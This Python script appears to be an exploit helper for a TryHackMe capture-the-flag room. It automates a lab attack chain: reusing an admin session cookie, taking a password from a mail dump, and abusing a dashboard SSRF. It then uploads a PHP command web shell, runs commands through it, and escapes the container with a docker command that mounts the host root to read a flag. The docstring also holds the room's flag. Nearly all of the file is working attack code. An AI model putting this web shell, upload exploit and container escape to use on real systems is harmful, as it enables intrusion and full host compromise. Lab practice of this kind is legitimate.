#!/usr/bin/env python3
"""
THM Sequence - Final flag helper (admin -> finance SSRF -> upload -> host flag).

What this script does:
1) Load admin/mod PHPSESSID from --phpsessid, THM_MOD_SID, or mod_sid.txt
2) Pull /mail/dump.txt and extract finance password candidate
3) Request finance.php through dashboard feature parameter (SSRF-like internal fetch)
4) Try common unlock request shapes
5) If upload form appears, upload a tiny PHP command shell
6) Trigger uploaded shell through dashboard feature request
7) Attempt docker-based host flag read command

This is a pragmatic helper for the room; it tries multiple request variants because
the finance unlock/upload flow is implemented client-side and can differ per room run.

THM{rootAccessD0n3}
"""

import argparse
import os
import re
import sys
from urllib.parse import urljoin

import requests


TARGET = "http://10.82.129.17"
SID_FILE = "mod_sid.txt"


def resolve_sid(cli_sid):
	if cli_sid:
		return cli_sid.strip()
	env_sid = os.getenv("THM_MOD_SID", "").strip()
	if env_sid:
		return env_sid
	sid_path = os.path.join(os.path.dirname(__file__), SID_FILE)
	try:
		with open(sid_path, "r", encoding="utf-8") as fh:
			sid = fh.read().strip()
			if sid:
				return sid
	except OSError:
		pass
	return None


def extract_flags(text):
	return re.findall(r"THM\{[^}]+\}", text or "")


def extract_finance_password(text):
	# Example seen in writeups: password (S60u}f5j)
	m = re.search(r"password\s*\(([^)]+)\)", text or "", re.I)
	if m:
		return m.group(1).strip()
	return None


def dashboard_feature(session, base, feature):
	try:
		r = session.post(
			f"{base}/dashboard.php",
			data={"feature": feature},
			timeout=15,
			allow_redirects=True,
		)
		return r.text
	except Exception as exc:
		return f"__ERR__ {exc}"


def try_unlock_finance(session, base, password):
	variants = [
		(f"{base}/dashboard.php", {"feature": "finance.php", "accessPassword": password}),
		(f"{base}/dashboard.php", {"feature": "finance.php", "password": password}),
		(f"{base}/dashboard.php", {"feature": "finance.php", "finance-accessPassword": password}),
		(f"{base}/finance.php", {"accessPassword": password}),
		(f"{base}/finance.php", {"password": password}),
	]
	for idx, (url, data) in enumerate(variants, 1):
		try:
			r = session.post(url, data=data, timeout=15, allow_redirects=True)
		except Exception as exc:
			print(f"  [unlock {idx}] error: {exc}")
			continue
		text = r.text or ""
		has_upload = "type=\"file\"" in text.lower() or "upload" in text.lower()
		print(f"  [unlock {idx}] status={r.status_code} upload_form={'yes' if has_upload else 'no'}")
		if has_upload:
			return text
	return None


def find_upload_form(html, base):
	form_m = re.search(r"<form[^>]*enctype=[\"']multipart/form-data[\"'][^>]*>", html or "", re.I)
	action = ""
	file_field = "file"
	if form_m:
		form_tag = form_m.group(0)
		act_m = re.search(r"action=[\"']([^\"']+)[\"']", form_tag, re.I)
		if act_m:
			action = act_m.group(1)
	input_m = re.search(r"<input[^>]*type=[\"']file[\"'][^>]*name=[\"']([^\"']+)[\"']", html or "", re.I)
	if input_m:
		file_field = input_m.group(1)

	if not action:
		# Common fallback for this room.
		action = "finance.php"
	upload_url = urljoin(base + "/", action)
	return upload_url, file_field


def upload_webshell(session, base, upload_url, file_field, filename, finance_pass):
	payload = (
		"<?php "
		"if(isset($_GET['c'])){"
		"echo 'WS_BEGIN\\n';"
		"system($_GET['c']);"
		"echo '\\nWS_END';"
		"}"
		"?>"
	)
	files = {file_field: (filename, payload, "application/x-php")}

	variants = [
		# Direct action URL (if exposed externally).
		(upload_url, {}),
		(upload_url, {"upload": "Upload"}),
		(upload_url, {"submit": "Upload"}),
		# Tunnel through dashboard feature endpoint (common in this room).
		(f"{base}/dashboard.php", {"feature": "finance.php", "upload": "Upload"}),
		(f"{base}/dashboard.php", {"feature": "finance.php", "submit": "Upload"}),
		(f"{base}/dashboard.php", {"feature": "finance.php", "accessPassword": finance_pass, "upload": "Upload"}),
	]

	for idx, (url, extra) in enumerate(variants, 1):
		try:
			r = session.post(url, data=extra, files=files, timeout=20, allow_redirects=True)
		except Exception as exc:
			print(f"  [upload {idx}] error: {exc}")
			continue
		text = r.text or ""
		print(f"  [upload {idx}] url={url} status={r.status_code}")

		m = re.search(r"(uploads/[A-Za-z0-9._-]+\.php)", text, re.I)
		if m:
			return m.group(1)
	return None


def trigger_shell(session, base, shell_path, cmd):
	rel = "/" + shell_path.lstrip("/")
	feature = f"{rel}?c={requests.utils.quote(cmd, safe='')}"
	text = dashboard_feature(session, base, feature)
	if text.startswith("__ERR__"):
		return None

	m = re.search(r"WS_BEGIN\s*(.*?)\s*WS_END", text, re.S)
	if m:
		return m.group(1).strip()
	return None


def main():
	parser = argparse.ArgumentParser(description="THM Sequence - final flag helper")
	parser.add_argument("--target", default=TARGET, help="Base URL (default: http://10.82.129.17)")
	parser.add_argument("--phpsessid", help="Admin/session cookie value")
	parser.add_argument("--finance-pass", help="Finance password (optional; auto from /mail/dump.txt)")
	parser.add_argument("--shell-name", default="shell.php", help="Uploaded shell filename")
	args = parser.parse_args()

	base = args.target.rstrip("/")
	sid = resolve_sid(args.phpsessid)
	if not sid:
		print("[!] Missing PHPSESSID. Provide --phpsessid or create mod_sid.txt.")
		sys.exit(1)

	s = requests.Session()
	s.cookies.set("PHPSESSID", sid)

	print(f"Target    : {base}")
	print(f"PHPSESSID : {sid}")

	# Check dashboard access and collect visible flags.
	try:
		d = s.get(f"{base}/dashboard.php", timeout=15, allow_redirects=True)
	except Exception as exc:
		print(f"[!] Dashboard request failed: {exc}")
		sys.exit(1)
	if "login" in d.url:
		print("[!] Session expired. Get a fresh admin session first.")
		sys.exit(1)
	visible_flags = extract_flags(d.text)
	print(f"[i] Dashboard flags: {visible_flags}")

	# Get finance password.
	finance_pass = args.finance_pass
	if not finance_pass:
		try:
			dump = s.get(f"{base}/mail/dump.txt", timeout=15, allow_redirects=True)
			finance_pass = extract_finance_password(dump.text)
		except Exception:
			finance_pass = None
	if not finance_pass:
		print("[!] Could not auto-extract finance password from /mail/dump.txt.")
		print("    Pass it with --finance-pass.")
		sys.exit(1)
	print(f"[i] Finance password: {finance_pass}")

	print("[1] Requesting finance feature through dashboard...")
	finance_html = dashboard_feature(s, base, "finance.php")
	if finance_html.startswith("__ERR__"):
		print(f"[!] finance request error: {finance_html}")
		sys.exit(1)

	if "type=\"file\"" not in finance_html.lower():
		print("[2] Unlocking finance panel...")
		unlocked = try_unlock_finance(s, base, finance_pass)
		if not unlocked:
			print("[!] Could not unlock upload panel automatically.")
			print("    Manually unlock in browser, then rerun this script.")
			sys.exit(1)
		finance_html = unlocked

	print("[3] Uploading webshell...")
	upload_url, file_field = find_upload_form(finance_html, base)
	print(f"  upload URL   : {upload_url}")
	print(f"  file field   : {file_field}")
	shell_path = upload_webshell(s, base, upload_url, file_field, args.shell_name, finance_pass)
	if not shell_path:
		# Common location fallback from writeups.
		shell_path = f"uploads/{args.shell_name}"
		print(f"  upload path not echoed; trying fallback: {shell_path}")
	else:
		print(f"  uploaded path: {shell_path}")

	print("[4] Testing shell command execution...")
	out = trigger_shell(s, base, shell_path, "id")
	if out is None:
		print("[!] Could not trigger shell via dashboard feature request.")
		print("    Try manually selecting feature=/uploads/<shell>.php in intercepted request.")
		sys.exit(1)
	print(f"  id -> {out}")

	print("[5] Attempting host flag read via docker...")
	cmd = "docker run --rm -v /:/host phpvulnerable:latest sh -c 'cat /host/root/flag.txt'"
	root_flag = trigger_shell(s, base, shell_path, cmd)
	if root_flag:
		root_flags = extract_flags(root_flag)
		print(f"[+] Command output:\n{root_flag}")
		if root_flags:
			print(f"\n[+] FINAL FLAG: {root_flags[0]}")
			return

	print("[!] Automatic host flag read did not return a THM flag yet.")
	print("    Try these commands through the same shell trigger:")
	print("    1) docker images")
	print("    2) docker run --rm -v /:/host phpvulnerable:latest sh -c 'ls -la /host/root && cat /host/root/flag.txt'")


if __name__ == "__main__":
	main()

